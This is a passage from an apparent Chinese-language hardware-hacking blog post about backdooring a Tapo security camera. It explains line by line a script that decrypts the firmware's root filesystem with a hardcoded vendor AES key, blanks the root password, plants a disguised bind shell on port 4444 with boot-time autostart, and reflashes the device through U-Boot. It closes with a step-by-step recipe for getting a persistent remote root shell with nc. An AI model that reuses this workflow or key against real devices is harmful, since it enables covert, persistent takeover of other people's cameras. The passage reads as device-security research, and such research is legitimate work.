\</span><br><span class="line">    <span class="built_in">dd</span> of=<span class="string">&quot;<span class="variable">$REPACKED</span>&quot;</span> bs=<span class="variable">$BLOCK_SIZE</span> seek=$((ROOTFS_START / BLOCK_SIZE)) conv=notrunc status=none</span><br><span class="line"><span class="built_in">dd</span> <span class="keyword">if</span>=<span class="string">&quot;<span class="variable">$MOD_SQUASHFS</span>&quot;</span> bs=<span class="variable">$BLOCK_SIZE</span> skip=1 seek=$(((ROOTFS_START + BLOCK_SIZE) / BLOCK_SIZE)) of=<span class="string">&quot;<span class="variable">$REPACKED</span>&quot;</span> conv=notrunc status=none</span><br><span class="line"></span><br><span class="line"><span class="built_in">dd</span> <span class="keyword">if</span>=<span class="string">&quot;<span class="variable">$REPACKED</span>&quot;</span> of=<span class="string">&quot;<span class="variable">$&#123;1&#125;</span>.rootfs_only.bin&quot;</span> bs=<span class="variable">$BLOCK_SIZE</span> skip=$((ROOTFS_START / BLOCK_SIZE)) count=$((ROOTFS_SIZE / BLOCK_SIZE)) status=none</span><br><span class="line"></span><br><span class="line"><span class="built_in">rm</span> -f <span class="string">&quot;<span class="variable">$SQUASHFS</span>&quot;</span> <span class="string">&quot;<span class="variable">$MOD_SQUASHFS</span>&quot;</span> <span class="string">&quot;<span class="variable">$&#123;1&#125;</span>.head&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;[+] Done!&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;[+] Full image:   <span class="variable">$REPACKED</span>&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;[+] Rootfs only:  <span class="variable">$&#123;1&#125;</span>.rootfs_only.bin&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;=== U-Boot flash commands ===&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;# Load rootfs_only.bin to RAM (e.g. from SD card):&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;fatload mmc 0 0x80600000 rootfs_only.bin&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;# Flash:&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;sf probe&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;sf erase 0x1B0000 0x220000&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;sf write 0x80600000 0x1B0000 0x220000&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>自动化 rootfs 修改脚本。输入 8MB 原始 Flash 镜像，输出可直接刷入的修改版 rootfs。</p>
+<h4 id="初始化与参数定义（第-1-23-行）"><a href="#初始化与参数定义（第-1-23-行）" class="headerlink" title="初始化与参数定义（第 1-23 行）"></a>初始化与参数定义（第 1-23 行）</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="built_in">set</span> -e    <span class="comment"># 任何命令失败立即退出，防止在错误状态下继续修改</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">BLOCK_SIZE=512                          <span class="comment"># dd 操作的块大小，也是 AES 加密的单位</span></span><br><span class="line">ROOTFS_START=0x1b0000                   <span class="comment"># rootfs 在 Flash 中的起始偏移（来自 /proc/mtd）</span></span><br><span class="line">ROOTFS_END=0x3d0000                     <span class="comment"># rootfs 结束偏移</span></span><br><span class="line">ROOTFS_SIZE=$(( ROOTFS_END - ROOTFS_START ))  <span class="comment"># = 0x220000 = 2,228,224 字节</span></span><br><span class="line">AES_KEY=54505f4c494e4b383869363637676e74      <span class="comment"># &quot;TP_LINK88i667gnt&quot; 的十六进制</span></span><br><span class="line">AES_IV=55aadeadc0de4c494e5558457854aa55       <span class="comment"># 初始化向量</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">BINDSHELL_B64=<span class="string">&quot;f0VMRgEBAQ...&quot;</span>    <span class="comment"># gen_bindshell.py 生成的 MIPS LE bind shell ELF</span></span><br><span class="line">                                  <span class="comment"># base64 编码后内嵌在脚本中，不再依赖 msfvenom</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="1-8-解密-rootfs-头部（第-25-27-行）"><a href="#1-8-解密-rootfs-头部（第-25-27-行）" class="headerlink" title="[1&#x2F;8] 解密 rootfs 头部（第 25-27 行）"></a>[1&#x2F;8] 解密 rootfs 头部（第 25-27 行）</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">dd</span> <span class="keyword">if</span>=<span class="string">&quot;<span class="variable">$1</span>&quot;</span> bs=<span class="variable">$BLOCK_SIZE</span> skip=$((ROOTFS_START / BLOCK_SIZE)) count=1 status=none | \</span><br><span class="line">    openssl enc -aes-128-cfb1 -d -nosalt -nopad -K <span class="variable">$AES_KEY</span> -iv <span class="variable">$AES_IV</span> &gt; <span class="string">&quot;<span class="variable">$&#123;1&#125;</span>.head&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>Flash 中 rootfs 的布局：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">0x1B0000 ┌──────────────────┐</span><br><span class="line">         │ 加密的 512 字节   │ ← AES-128-CFB1 加密（SquashFS 头部）</span><br><span class="line">0x1B0200 ├──────────────────┤</span><br><span class="line">         │ 明文 SquashFS     │ ← 剩余部分未加密</span><br><span class="line">         │ ...               │</span><br><span class="line">0x3D0000 └──────────────────┘</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>dd skip=$((0x1B0000/512))</code> &#x3D; 跳过 Flash 前面的分区，定位到 rootfs 起始位置</li>
+<li><code>count=1</code> &#x3D; 只读 1 个 block（512 字节），就是加密的头部</li>
+<li>通过管道送给 <code>openssl</code> 解密</li>
+<li><code>-aes-128-cfb1</code> &#x3D; CFB1 模式（逐 bit 反馈，极其少见）</li>
+<li><code>-nosalt -nopad</code> &#x3D; 无盐值、无填充（原始加密，512 字节进 512 字节出）</li>
+<li>解密结果保存为 <code>dump.bin.head</code></li>
+</ul>
+<h4 id="2-8-提取-rootfs（第-29-32-行）"><a href="#2-8-提取-rootfs（第-29-32-行）" class="headerlink" title="[2&#x2F;8] 提取 rootfs（第 29-32 行）"></a>[2&#x2F;8] 提取 rootfs（第 29-32 行）</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cp</span> <span class="string">&quot;<span class="variable">$1</span>&quot;</span> <span class="string">&quot;<span class="variable">$REPACKED</span>&quot;</span>                    <span class="comment"># 复制整个 8MB dump 作为工作副本</span></span><br><span class="line"><span class="built_in">dd</span> <span class="keyword">if</span>=<span class="string">&quot;<span class="variable">$&#123;1&#125;</span>.head&quot;</span> of=<span class="string">&quot;<span class="variable">$REPACKED</span>&quot;</span> \      <span class="comment"># 把解密后的头部写回工作副本的对应位置</span></span><br><span class="line">   bs=<span class="variable">$BLOCK_SIZE</span> seek=$((ROOTFS_START / BLOCK_SIZE)) conv=notrunc</span><br><span class="line"></span><br><span class="line"><span class="built_in">dd</span> <span class="keyword">if</span>=<span class="string">&quot;<span class="variable">$REPACKED</span>&quot;</span> of=<span class="string">&quot;<span class="variable">$SQUASHFS</span>&quot;</span> \     <span class="comment"># 从工作副本中切出 rootfs 区域</span></span><br><span class="line">   bs=<span class="variable">$BLOCK_SIZE</span> skip=$((ROOTFS_START / BLOCK_SIZE)) count=$((ROOTFS_SIZE / BLOCK_SIZE))</span><br></pre></td></tr></table></figure>
+
+<p>经过这步，<code>$SQUASHFS</code> 是一个完整的、已解密的 SquashFS 镜像，可以直接 unsquashfs。</p>
+<p>流程图：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dump.bin (加密头) → 复制 → repacked (解密头写入) → 切出 rootfs → squashfs (明文)</span><br></pre></td></tr></table></figure>
+
+<h4 id="3-8-解包-SquashFS（第-34-36-行）"><a href="#3-8-解包-SquashFS（第-34-36-行）" class="headerlink" title="[3&#x2F;8] 解包 SquashFS（第 34-36 行）"></a>[3&#x2F;8] 解包 SquashFS（第 34-36 行）</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">rm</span> -rf squashfs-root                   <span class="comment"># 清除上次残留</span></span><br><span class="line">unsquashfs -quiet <span class="string">&quot;<span class="variable">$SQUASHFS</span>&quot;</span>          <span class="comment"># 解包到 squashfs-root/ 目录</span></span><br></pre></td></tr></table></figure>
+
+<p>解包后得到完整的文件系统目录树，可以像普通文件一样修改。</p>
+<h4 id="4-8-清除-root-密码（第-38-39-行）"><a href="#4-8-清除-root-密码（第-38-39-行）" class="headerlink" title="[4&#x2F;8] 清除 root 密码（第 38-39 行）"></a>[4&#x2F;8] 清除 root 密码（第 38-39 行）</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sed -i <span class="string">&#x27;&#x27;</span> <span class="string">&#x27;s|^root:[^:]*:|root::|&#x27;</span> squashfs-root/etc/passwd</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>^root:</code> &#x3D; 匹配以 <code>root:</code> 开头的行</li>
+<li><code>[^:]*:</code> &#x3D; 匹配密码哈希字段（第二个冒号之前的内容）</li>
+<li>替换为 <code>root::</code> &#x3D; 密码字段留空，表示无密码</li>
+<li><code>-i &#39;&#39;</code> &#x3D; macOS sed 的原地编辑语法（Linux 用 <code>-i</code>，无 <code>&#39;&#39;</code>）</li>
+</ul>
+<p>修改前：<code>root:$1$xxxx$hash:0:0:root:/root:/bin/ash</code><br>修改后：<code>root::0:0:root:/root:/bin/ash</code></p>
+<h4 id="5-8-安装-bindshell（第-41-43-行）"><a href="#5-8-安装-bindshell（第-41-43-行）" class="headerlink" title="[5&#x2F;8] 安装 bindshell（第 41-43 行）"></a>[5&#x2F;8] 安装 bindshell（第 41-43 行）</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$BINDSHELL_B64</span>&quot;</span> | <span class="built_in">base64</span> -d &gt; squashfs-root/usr/sbin/bindshell</span><br><span class="line"><span class="built_in">chmod</span> 755 squashfs-root/usr/sbin/bindshell</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>将内嵌的 base64 字符串解码为 348 字节的 MIPS LE ELF 二进制</li>
+<li>放到 <code>/usr/sbin/bindshell</code>，看起来像一个正常的系统工具</li>
+<li><code>chmod 755</code> 设置可执行权限（在 mksquashfs 重建时会保留此权限）</li>
+</ul>
+<p>这个 bindshell 的功能：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">socket(AF_INET, SOCK_STREAM, 0)     → 创建 TCP socket</span><br><span class="line">bind(0.0.0.0:4444)                   → 绑定到所有接口的 4444 端口</span><br><span class="line">listen()                             → 开始监听</span><br><span class="line">accept()                             → 等待连接</span><br><span class="line">dup2(fd, 0/1/2)                      → 将 stdin/stdout/stderr 重定向到连接</span><br><span class="line">execve(&quot;/bin/sh&quot;)                    → 启动 shell</span><br></pre></td></tr></table></figure>
+
+<h4 id="6-8-修改-rcS-—-bindshell-自启动（第-45-50-行）"><a href="#6-8-修改-rcS-—-bindshell-自启动（第-45-50-行）" class="headerlink" title="[6&#x2F;8] 修改 rcS — bindshell 自启动（第 45-50 行）"></a>[6&#x2F;8] 修改 rcS — bindshell 自启动（第 45-50 行）</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> &gt;&gt; squashfs-root/etc/init.d/rcS &lt;&lt; <span class="string">&#x27;RCSEOF&#x27;</span></span><br><span class="line"><span class="built_in">cp</span> /usr/sbin/bindshell /tmp/bindshell</span><br><span class="line"><span class="built_in">chmod</span> 777 /tmp/bindshell</span><br><span class="line">/tmp/bindshell&amp;</span><br><span class="line">RCSEOF</span><br></pre></td></tr></table></figure>
+
+<p>在 rcS 末尾追加三行。为什么不直接执行 <code>/usr/sbin/bindshell</code>？</p>
+<ul>
+<li>SquashFS 是只读文件系统，即使文件有 +x 权限，某些情况下内核可能阻止直接执行</li>
+<li>保险方案：先 <code>cp</code> 到 <code>/tmp</code>（tmpfs，内存文件系统，可读写）</li>
+<li><code>chmod 777</code> 确保一定有执行权限</li>
+<li><code>&amp;</code> 后台运行，不阻塞后续启动脚本（S05boot → S15monitor → S20main）</li>
+</ul>
+<p>执行顺序：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/sbin/init → rcS → run_scripts (后台) → cp bindshell → chmod → bindshell (后台)</span><br><span class="line">                 ↓</span><br><span class="line">              S05boot → S15monitor → S20main → /bin/main → WiFi AP 启动</span><br></pre></td></tr></table></figure>
+
+<p>bindshell 和 main 并行运行，互不干扰。</p>
+<h4 id="7-8-修改-preinit-—-spdev-fallback（第-52-63-行）"><a href="#7-8-修改-preinit-—-spdev-fallback（第-52-63-行）" class="headerlink" title="[7&#x2F;8] 修改 preinit — spdev fallback（第 52-63 行）"></a>[7&#x2F;8] 修改 preinit — spdev fallback（第 52-63 行）</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">python3 &lt;&lt; <span class="string">&#x27;PYEOF&#x27;</span></span><br><span class="line">with open(<span class="string">&#x27;squashfs-root/etc/preinit&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) as f:</span><br><span class="line">    lines = f.readlines()</span><br><span class="line">out = []</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> lines:</span><br><span class="line">    out.append(line)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;spdev=$(awk&#x27;</span> <span class="keyword">in</span> line:                                    <span class="comment"># 找到解析 spdev 的那行</span></span><br><span class="line">        out.append(<span class="string">&#x27;    [ &quot;$spdev&quot; = &quot;&quot; ] &amp;&amp; spdev=&quot;/dev/mtdblock7&quot;\n&#x27;</span>)  <span class="comment"># 在它后面插入 fallback</span></span><br><span class="line">with open(<span class="string">&#x27;squashfs-root/etc/preinit&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) as f:</span><br><span class="line">    f.writelines(out)</span><br><span class="line">PYEOF</span><br></pre></td></tr></table></figure>
+
+<p>用 Python 而不是 sed，因为 macOS sed 处理多行替换语法复杂且容易出错。</p>
+<p>修改效果：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 原始 preinit 中的 mount_sp_rom()：</span></span><br><span class="line"><span class="function"><span class="title">mount_sp_rom</span></span>() &#123;</span><br><span class="line">    spdev=$(awk <span class="string">&#x27;BEGIN&#123;RS=&quot; &quot;;FS=&quot;=&quot;&#125; $1==&quot;spdev&quot;&#123;print $2&#125;&#x27;</span> &lt; /proc/cmdline)</span><br><span class="line">    [ <span class="string">&quot;<span class="variable">$spdev</span>&quot;</span> = <span class="string">&quot;&quot;</span> ] &amp;&amp; spdev=<span class="string">&quot;/dev/mtdblock7&quot;</span>    <span class="comment"># ← 新增：没有 spdev 参数就用默认值</span></span><br><span class="line">    <span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$spdev</span>&quot;</span> != <span class="string">&quot;&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">        mount -t squashfs -o relatime <span class="variable">$spdev</span> /sp_rom</span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>为什么这一行就够了：</p>
+<ol>
+<li>bootargs 有 <code>spdev=/dev/mtdblock7</code> → awk 解析到 → 用 bootargs 的值</li>
+<li>bootargs 没有 <code>spdev</code> → awk 解析为空 → fallback 设为 <code>/dev/mtdblock7</code></li>
+<li>两种情况下 <code>$spdev</code> 都非空 → <code>if [ &quot;$spdev&quot; != &quot;&quot; ]</code> 一定为真 → sp_rom 一定被挂载</li>
+</ol>
+<h4 id="8-8-重建-rootfs（第-65-83-行）"><a href="#8-8-重建-rootfs（第-65-83-行）" class="headerlink" title="[8&#x2F;8] 重建 rootfs（第 65-83 行）"></a>[8&#x2F;8] 重建 rootfs（第 65-83 行）</h4><p><strong>重建 SquashFS：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mksquashfs squashfs-root <span class="string">&quot;<span class="variable">$MOD_SQUASHFS</span>&quot;</span> -quiet -comp xz</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>-comp xz</code> &#x3D; 使用 XZ 压缩（与原厂一致，压缩率最高）</li>
+<li>输出文件必须 ≤ 2,228,224 字节（rootfs 分区大小），否则会溢出到 sp_rom 分区</li>
+</ul>
+<p><strong>安全检查：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">MOD_SIZE=$(<span class="built_in">stat</span> -f%z <span class="string">&quot;<span class="variable">$MOD_SQUASHFS</span>&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$MOD_SIZE</span>&quot;</span> -gt <span class="string">&quot;<span class="variable">$ROOTFS_SIZE</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;[-] ERROR: SquashFS too large&quot;</span></span><br><span class="line">    <span class="built_in">exit</span> 1</span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>写回 repacked 镜像（三步）：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 步骤 A：将 repacked 中 rootfs 区域全部清零</span></span><br><span class="line"><span class="built_in">dd</span> <span class="keyword">if</span>=/dev/zero ... seek=$((ROOTFS_START / BLOCK_SIZE)) count=$((ROOTFS_SIZE / BLOCK_SIZE)) of=<span class="string">&quot;<span class="variable">$REPACKED</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 步骤 B：取修改后 SquashFS 的前 512 字节，AES 加密后写入 repacked</span></span><br><span class="line"><span class="built_in">dd</span> <span class="keyword">if</span>=<span class="string">&quot;<span class="variable">$MOD_SQUASHFS</span>&quot;</span> bs=<span class="variable">$BLOCK_SIZE</span> count=1 | \</span><br><span class="line">    openssl enc -aes-128-cfb1 -e ... | \</span><br><span class="line">    <span class="built_in">dd</span> of=<span class="string">&quot;<span class="variable">$REPACKED</span>&quot;</span> bs=<span class="variable">$BLOCK_SIZE</span> seek=$((ROOTFS_START / BLOCK_SIZE))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 步骤 C：剩余部分（第 513 字节起）直接写入，不加密</span></span><br><span class="line"><span class="built_in">dd</span> <span class="keyword">if</span>=<span class="string">&quot;<span class="variable">$MOD_SQUASHFS</span>&quot;</span> bs=<span class="variable">$BLOCK_SIZE</span> skip=1 seek=$(((ROOTFS_START + BLOCK_SIZE) / BLOCK_SIZE)) of=<span class="string">&quot;<span class="variable">$REPACKED</span>&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>为什么分三步：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">修改后的 SquashFS：  [明文头 512B] [明文body...]</span><br><span class="line">                        ↓ 加密          ↓ 不加密</span><br><span class="line">写入 repacked：      [密文头 512B] [明文body...]</span><br><span class="line">                     ↑ 步骤 B        ↑ 步骤 C</span><br></pre></td></tr></table></figure>
+
+<p>Flash 上只有前 512 字节是加密的，必须分开处理。</p>
+<p><strong>提取 rootfs_only：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">dd</span> <span class="keyword">if</span>=<span class="string">&quot;<span class="variable">$REPACKED</span>&quot;</span> of=<span class="string">&quot;<span class="variable">$&#123;1&#125;</span>.rootfs_only.bin&quot;</span> \</span><br><span class="line">   bs=<span class="variable">$BLOCK_SIZE</span> skip=$((ROOTFS_START / BLOCK_SIZE)) count=$((ROOTFS_SIZE / BLOCK_SIZE))</span><br></pre></td></tr></table></figure>
+
+<p>从 8MB repacked 镜像中只切出 rootfs 部分（2.2MB），传输更快，U-Boot 刷入时直接加载到 0x80600000 写入 0x1B0000 即可。</p>
+<hr>
+<h3 id="写入-SD-卡"><a href="#写入-SD-卡" class="headerlink" title="写入 SD 卡"></a>写入 SD 卡</h3><p><img src="/86faf84cbfba83c114f0c0b9f985044d.png" alt="86faf84cbfba83c114f0c0b9f985044d"></p>
+<p>拿到<code>dump.bin.rootfs_only.bin</code>。</p>
+<p><img src="/202ba5cbfa2eddc03660f60a948bd418.png" alt="202ba5cbfa2eddc03660f60a948bd418"></p>
+<hr>
+<h2 id="七、给摄像头刷入有后门的固件"><a href="#七、给摄像头刷入有后门的固件" class="headerlink" title="七、给摄像头刷入有后门的固件"></a>七、给摄像头刷入有后门的固件</h2><p><img src="/0824c37dd51fe231146138adcb517946.png" alt="0824c37dd51fe231146138adcb517946"></p>
+<p>执行了：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mmc <span class="built_in">read</span> 0x80600000 0 0x1100   </span><br><span class="line">sf probe                 </span><br><span class="line">sf erase 0x1B0000 0x220000       </span><br><span class="line">sf write 0x80600000 0x1B0000 0x220000       </span><br><span class="line">reset  </span><br></pre></td></tr></table></figure>
+
+<p>解释：</p>
+<ul>
+<li><code>mmc read 0x80600000 0 0x1100</code> — 从 SD 卡读取修改后的 rootfs 到内存（0x1100 &#x3D; 4352 块 &#x3D; 2.2MB）</li>
+<li><code>sf probe</code> — 初始化 SPI Flash</li>
+<li><code>sf erase 0x1B0000 0x220000</code> — 擦除原 rootfs 分区</li>
+<li><code>sf write 0x80600000 0x1B0000 0x220000</code> — 将修改后的 rootfs 写入 Flash</li>
+<li><code>reset</code> — 重启</li>
+</ul>
+<p>wifi里连上<code>tapo-cam-6554</code></p>
+<p>nc连接：</p>
+<p><img src="/af0e8fde87947df9ed60949bc5958a63.png" alt="af0e8fde87947df9ed60949bc5958a63"></p>
+<p>成功拿到远程 root shell！！</p>
+<hr>
+<h2 id="八、总结攻击成果"><a href="#八、总结攻击成果" class="headerlink" title="八、总结攻击成果"></a>八、总结攻击成果</h2><p>从拆机到实现远程持久化 root shell。最终效果：摄像头通电即自动启动 WiFi AP 和 bind shell，<br>攻击者无需物理接触，连接 WiFi 后 <code>nc 192.168.191.1 4444</code> 即获得 root 权限。</p>
+<p>操作流程：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">┌─────────────────────────────────────────────────┐</span><br><span class="line">│  第一步：U-Boot dump Flash                       │</span><br><span class="line">│  sf probe                                        │</span><br><span class="line">│  sf read 0x80600000 0 0x800000                   │</span><br><span class="line">│  mmc write 0x80600000 0 0x4000                   │</span><br><span class="line">├─────────────────────────────────────────────────┤</span><br><span class="line">│  第二步：SD 卡转到 Mac，读取 dump                 │</span><br><span class="line">│  sudo dd if=/dev/rdiskN of=dump.bin bs=512 \     │</span><br><span class="line">│       count=16384                                │</span><br><span class="line">├─────────────────────────────────────────────────┤</span><br><span class="line">│  第三步：运行 mshell.sh                           │</span><br><span class="line">│  ./mshell.sh dump.bin                            │</span><br><span class="line">├─────────────────────────────────────────────────┤</span><br><span class="line">│  第四步：写回 SD 卡                               │</span><br><span class="line">│  sudo dd if=dump.bin.rootfs_only.bin \           │</span><br><span class="line">│       of=/dev/rdiskN bs=512                      │</span><br><span class="line">│  diskutil eject /dev/diskN                       │</span><br><span class="line">├─────────────────────────────────────────────────┤</span><br><span class="line">│  第五步：U-Boot 刷入                              │</span><br><span class="line">│  mmc read 0x80600000 0 0x1100                    │</span><br><span class="line">│  sf probe                                        │</span><br><span class="line">│  sf erase 0x1B0000 0x220000                      │</span><br><span class="line">│  sf write 0x80600000 0x1B0000 0x220000           │</span><br><span class="line">│  reset                                           │</span><br><span class="line">├─────────────────────────────────────────────────┤</span><br><span class="line">│  第六步：连接 WiFi + 获取 shell                    │</span><br><span class="line">│  Mac 连接 Tapo_Cam_XXXX WiFi                     │</span><br><span class="line">│  nc 192.168.191.1 4444                           │</span><br><span class="line">│  → root shell                                    │</span><br><span class="line">└─────────────────────────────────────────────────┘</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="九、其它踩坑全记录"><a href="#九、其它踩坑全记录" class="headerlink" title="九、其它踩坑全记录"></a>九、其它踩坑全记录</h2><h3 id="9-1-JFFS2-放不下-busybox"><a href="#9-1-JFFS2-放不下-busybox" class="headerlink" title="9.1 JFFS2 放不下 busybox"></a>9.1 JFFS2 放不下 busybox</h3><p><strong>问题</strong>：最初计划把 busybox-mipsel（1.6MB）放到 JFFS2 分区（user_record, 512KB）运行 telnetd。<br><strong>报错</strong>：<code>cp: write error: No space left on device</code><br><strong>解决</strong>：用纯 Python 写的 MIPS LE ELF 生成器生成了 348 字节的 bindshell 二进制，然后 base64 编码后硬编码进 mshell.sh。</p>
+<hr>
+<h3 id="9-2-rootfs-放不下-busybox-原文件"><a href="#9-2-rootfs-放不下-busybox-原文件" class="headerlink" title="9.2 rootfs 放不下 busybox + 原文件"></a>9.2 rootfs 放不下 busybox + 原文件</h3><p><strong>问题</strong>：把 busybox 加到 rootfs 后，SquashFS 重建后超过 2.2MB 分区限制。<br><strong>解决</strong>：同上，使用极小的 bindshell 代替 busybox。</p>
+<hr>
+<h3 id="9-3-bindshell-无可执行权限"><a href="#9-3-bindshell-无可执行权限" class="headerlink" title="9.3 bindshell 无可执行权限"></a>9.3 bindshell 无可执行权限</h3><p><strong>问题</strong>：msfvenom 生成的 ELF 放入 SquashFS 后丢失 +x 权限，无法直接执行。  </p>
+<p>具体表现，nc连上之后无反应排查发现，用ls -l看到只读权限。</p>
+<p><strong>报错</strong>：<code>/usr/sbin/bindshell: Permission denied</code><br><strong>解决</strong>：在 rcS 中先复制到 tmpfs 再赋权：</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cp</span> /usr/sbin/bindshell /tmp/bindshell</span><br><span class="line"><span class="built_in">chmod</span> 777 /tmp/bindshell</span><br><span class="line">/tmp/bindshell &amp;</span><br></pre></td></tr></table></figure>
+
+<p>SquashFS 是只读文件系统，无法运行时改权限，但 &#x2F;tmp 是 tmpfs（内存文件系统），可以自由操作。</p>
+<hr>
